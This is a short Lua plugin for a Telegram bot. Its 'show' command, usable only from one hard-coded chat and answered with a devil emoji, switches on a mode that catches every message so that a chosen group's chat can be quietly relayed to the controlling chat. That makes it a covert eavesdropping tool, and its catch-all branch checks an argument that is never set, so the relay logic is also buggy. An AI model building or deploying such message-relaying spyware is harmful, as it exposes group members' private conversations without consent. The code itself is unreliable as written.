local function run(msg, matches)
    local name = msg.from.print_name
    if matches[1] == "show" or matches[1] == "Show" and matches[2] then
    if msg.to.id == 142334685 then
    show = 1
    chatseeid = matches[2]
    return "فعال 😈"
    else
    send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
    end
    elseif matches[1] == "stopshow" or matches[1] == "Stopshow" then
    if msg.to.id == 142334685 then
    show = 0
    return "غیر فعال"
    else
    send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
    end
    else
    if tonumber(show) == 1 then
    if tonumber(msg.to.id) == tonumber(matches[2]) then
    local send = send_msg('chat#142334685', matches[1], ok_cb, false)
    end
    end
    end
end
return {
     patterns = {
        "^([Ss]how) (%d+)$",
        "^([Ss]topshow)$",
        "^(.*)$"
        },
     run = run
}
